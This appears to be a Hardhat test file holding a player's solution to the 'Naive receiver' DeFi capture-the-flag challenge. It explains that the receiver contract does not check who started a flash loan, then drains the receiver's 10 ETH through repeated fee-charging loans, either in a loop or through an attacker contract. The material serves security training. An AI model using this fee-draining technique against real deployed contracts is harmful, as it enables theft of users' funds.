const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Naive receiver", function () {
    let deployer, user, player
    let pool, receiver

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = 1000n * 10n ** 18n

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, user, player] = await ethers.getSigners()

        const LenderPoolFactory = await ethers.getContractFactory("NaiveReceiverLenderPool", deployer)
        const FlashLoanReceiverFactory = await ethers.getContractFactory("FlashLoanReceiver", deployer)

        pool = await LenderPoolFactory.deploy()
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL })
        const ETH = await pool.ETH()

        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL)
        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL)
        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n)

        receiver = await FlashLoanReceiverFactory.deploy(pool.address)
        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER })

        //caller must be the pool
        await expect(receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n ** 18n, "0x")).to.be.reverted
        expect(await ethers.provider.getBalance(receiver.address)).to.eq(ETHER_IN_RECEIVER)
    })

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */

        // anyone can take a FL on behalf of the receiver => function onFlashLoan(address, ... =>
        // the first parameter (msg.sender - provided by the pool contract) should be checked by the receiver contract =>
        // therefore, anyone can drain the Receiver contract

        // Either, call 10 ytimes the flashLoan function
        // let amount = ethers.utils.parseEther("1") // could be any amount up to 1000 ETH
        // const ETH = await pool.ETH()

        // for (let i = 1; i <= 10; i++) {
        //     await pool.connect(player).flashLoan(receiver.address, ETH, amount, [])
        // }

        // Or, call the flashLoan function 10 times from an attacker contract => this requires only 1 txn
        const attackerFactory = await ethers.getContractFactory("NaiveReceiverAttacker")
        const attacker = await attackerFactory.deploy(pool.address, receiver.address)

        await attacker.attack()

        console.log(await ethers.provider.getBalance(pool.address))
        console.log(await ethers.provider.getBalance(receiver.address))
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // All ETH has been drained from the receiver
        expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(0)
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER)
    })
})
